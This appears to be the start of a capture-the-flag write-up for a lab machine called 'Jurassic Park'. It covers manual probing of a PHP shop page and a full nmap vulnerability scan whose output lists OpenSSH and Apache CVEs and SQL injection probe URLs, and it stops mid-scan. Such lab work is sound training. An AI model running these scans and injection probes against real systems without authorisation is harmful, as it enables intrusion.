# Jurassic Park

Our target is 10.10.105.134.

This is a *very* simple site: An index page (`index.php`) that leads to a `shop.php` page, which in turn links to three calls of `item.php?id=X` (where `X` is a number).

* Trying to include `/etc/os-release` via `item.php` causes the site to display a Dennis Nedry page that taunts you to use SQLMap. Trying a hand-crafted test SQL injection also displays this page.
* Trying different random indexes mostly doesn't work, though `item.php?id=100` displays a curiously broken page.
* Trying `item.php?id=..` throws an SQL error revealing that the site is running on MySQL.

Let's see if our usual nmap scan turns up anything interesting:

```bash
sudo nmap -v -oA jurassic-park -Pn -A -T4 -sS \
          -script vuln -p- 10.10.105.134
```

This gives the following output:

```
# Nmap 7.92 scan initiated Wed Feb  2 20:28:37 2022 as: nmap -v -oA jurassic-park -Pn -A -T4 -sS -script vuln -p- 10.10.105.134
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.105.134
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
|     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
|     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
|     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
|     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
|     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
|     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
|     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
|     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
|     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
|     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	5.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
|     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
|     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
|     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
|     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
|     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
|     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
|     	EDB-ID:40119	5.5	https://vulners.com/exploitdb/EDB-ID:40119	*EXPLOIT*
|     	EDB-ID:39569	5.5	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
|     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.0	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
|     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
|     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
|     	EDB-ID:40136	4.3	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
|     	EDB-ID:40113	4.3	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
|     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
|     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
|     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
|     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
|     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
|     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
|     	SRC-2016-0002	0.0	https://vulners.com/srcincite/SRC-2016-0002	*EXPLOIT*
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
|     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.10.105.134:80/item.php?id=1%27%20OR%20sqlspider
|     http://10.10.105.134:80/item.php?id=2%27%20OR%20sqlspider
|     http://10.10.105.134:80/item.php?id=3%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.10.105.134:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://10.10.105.134:80/assets/?C=N%3BO%3DA%27%20OR%20sqlspider
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
|     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	EDB-ID:46676	7.2	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
|     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
|     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
|     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1333/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
|     	EDB-ID:42745	5.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
|     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
|     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
|     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
|     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
|     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
|     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
|     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
